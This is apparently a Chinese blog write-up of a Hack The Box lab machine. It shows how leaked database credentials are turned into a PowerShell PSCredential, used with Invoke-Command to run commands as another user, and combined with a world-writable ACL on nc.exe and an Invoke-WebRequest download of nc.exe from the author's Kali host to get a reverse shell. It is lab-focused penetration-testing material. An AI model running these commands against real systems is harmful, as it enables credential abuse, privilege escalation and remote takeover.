---
layout:     post
title:      "利用 PSCredential 越权反弹 shell"
subtitle:   "从一道 HTB 靶机了解 WINDOWS 越权执行 cmdlet"
date:       2020-03-10 00:28:00
author:     "WuJ"
header-img: "img/img8.jpg"
header-mask: 0
tags:
    - 渗透测试
    - WINDOWS 提权
catalog: true
---



## 题目设定与前提

近期做 HTB 学习到了一些 WINDOWS 越权执行的知识，通过前期信息收集与渗透，目前我们已经通过 webshell 新建一了个临时目录 Temp，并上传了 nc.exe 拿到了靶机中的普通用户权限。

![image-20200310164628331](https://tva1.sinaimg.cn/large/00831rSTgy1gcoxf4sjpyj30im060gms.jpg)

同时还从 db.php 发现了一个 dbuser 的凭证

![Xnip2020-03-09_01-44-55 2](https://tva1.sinaimg.cn/large/00831rSTgy1gcoszxr5pqj31460ektcf.jpg)

查看用户组，发现这是用户 “Chris” 的凭证。现在我们需要做的就是要越权到用户 Chris 目录下

## 生成 PSCredential 对象

很多 Powershell 的 cmdlet 可以添加一个 PSCredential 的对象，用于使用特定用户运行 cmdlet。有两种方式生成 PSCredential 对象

### 方法一

------

使用 `Get-Credential` 命令，会让输入用户名和密码，这种方式可以被用于交互式模式下

![Xnip2020-03-10_15-16-41](https://tva1.sinaimg.cn/large/00831rSTgy1gcouvm8y5lj319v0u0dnz.jpg)

![Xnip2020-03-10_15-18-21](https://tva1.sinaimg.cn/large/00831rSTgy1gcouvqvo29j31aq0p00zp.jpg)

### 方法二

------

大多数情况下，你不会希望在交互模式下生成 `credential objects`，因为这样无法在脚本或自动化工具中使用

为此我们需要先生成一个包含密码的 `secure string`，之后将 `secure string` 和用户名传给 `System.Management.Automation` 的 PSCredential 方法

**具体操作**

```shell
$secpasswd = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("username", $secpasswd)
```

下面我们分析一下上述 cmdlets

`ScureStrings` 是微软在 2.0 版本的 .NET 中引进的一个类，相比于传统 Strings 类更适合用于密码等加密信息，其新特性为：

1. 不再是不可改变的
2. 可被人工销毁
3. 不再会在内存中已明文保存密码，防止被内存提取

`ConvertTo-SecureString -AsPlainText` 可以将密码以明文储存进 `secure string`，但 `-Force` 选项是必需的，因为明文存储本身是危险的，会被禁止

`New-Object System.Management.Automation.PSCredential ("username", $secpasswd)` 生成一个 PSCredential 对象，用于后续 cmdlets 的执行

[powershell-credentials-and-securestrings](https://www.quickstart.com/blog/powershell-credentials-and-securestrings-part-i/)

[How to Add Credential Parameters to PowerShell Functions](http://duffney.io/AddCredentialsToPowerShellFunctions#with-credentials-in-a-variable)

 ![image-20200310162500289](https://tva1.sinaimg.cn/large/00831rSTgy1gcowstksurj31e40gmq7v.jpg)

## Invoke-Command 远程执行反弹 shell

Invoke-Command 可以远程执行 cmdlets，具体操作如下

```shell
Invoke-Command –ComputerName MyServer1 -ScriptBlock {whoami}
Invoke-Command –ComputerName MyServer1 -Credential demo\serveradmin -ScriptBlock {whoami}
```

![image-20200310164428895](https://tva1.sinaimg.cn/large/00831rSTgy1gcoxd2zlysj31e808c431.jpg)

这样实际上我们已经成功越权获得另一个用户 Chris 的权限，下面我们尝试反弹 Chris 的 shell 获得更方便的利用

直接利用之前上传的 nc 反弹，显示权限不足

![Xnip2020-03-10_17-46-10](https://tva1.sinaimg.cn/large/00831rSTgy1gcoz60ih12j31e40fkjz6.jpg)

有两个方法解决

### 方法一

------

修改 nc.exe 的权限，允许任意用户直接运行

首先查看 nc.exe 原本的权限

![image-20200310174933649](https://tva1.sinaimg.cn/large/00831rSTgy1gcoz8shjbxj313e0d6q58.jpg)

修改权限

`cacls nc.exe /t /e /g everyone:f`

`/t` 表示修改文件夹及子文件夹中所有文件的ACL.
`/e `表示仅做编辑工作而不替换.
`/c `表示在出现拒绝访问错误时继续.
`/g every:f`表示给予本地所有用户以完全控制的权限.
`"f"`代表完全控制，如果只是希望给予读取权限，那么应当是 `"r"`

再次查看权限，发现权限修改成功

![image-20200310175336704](https://tva1.sinaimg.cn/large/00831rSTgy1gcozd0t1dpj313c0gutbs.jpg)

重新远程反弹 shell

![image-20200310175612690](https://tva1.sinaimg.cn/large/00831rSTgy1gcozfpha0rj31e60imwmq.jpg)

成功获取用户 Chris 的 shell

### 方法二

------

既然默认用户下的 nc 无权运行，那就向用户 Chris 上传一个新的 nc

先了解一下 `Invoke-WebRequest`

相当于 `curl` 命令，获取 http 的请求访问内容

**语法Syntax**

```shell
Parameter Set: Default
Invoke-WebRequest [-Uri] <Uri> [-Body <Object> ] [-Certificate <X509Certificate> ] [-CertificateThumbprint <String> ] [-ContentType <String> ] [-Credential <PSCredential> ] [-DisableKeepAlive] [-Headers <IDictionary> ] [-InFile <String> ] [-MaximumRedirection <Int32> ] [-Method <WebRequestMethod> {Default | Get | Head | Post | Put | Delete | Trace | Options | Merge | Patch} ] [-OutFile <String> ] [-PassThru] [-Proxy <Uri> ] [-ProxyCredential <PSCredential> ] [-ProxyUseDefaultCredentials] [-SessionVariable <String> ] [-TimeoutSec <Int32> ] [-TransferEncoding <String> {chunked | compress | deflate | gzip | identity} ] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent <String> ] [-WebSession <WebRequestSession> ] [ <CommonParameters>]
```

我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下

```shell
Invoke-Command -ComputerName sniper -Credential $cred -ScriptBlock {cd C:\Users\Chris\Documents\;$url="http://10.10.15.11/nc.exe";$output="C:\Users\Chris\Documents\nc.exe";Invoke-WebRequest -Uri $url -Outfile $output;dir}
```

![image-20200310183924496](https://tva1.sinaimg.cn/large/00831rSTgy1gcp0r35n46j31e80na0z9.jpg)

再远程反弹 shell，成功

![image-20200310184122085](https://tva1.sinaimg.cn/large/00831rSTgy1gcp0qosjh7j31e20gotfm.jpg)

## 总结

上述即为整个越权反弹 shell 的内容，一些很基本的命令结合起来使用就能达到很神奇的效果。

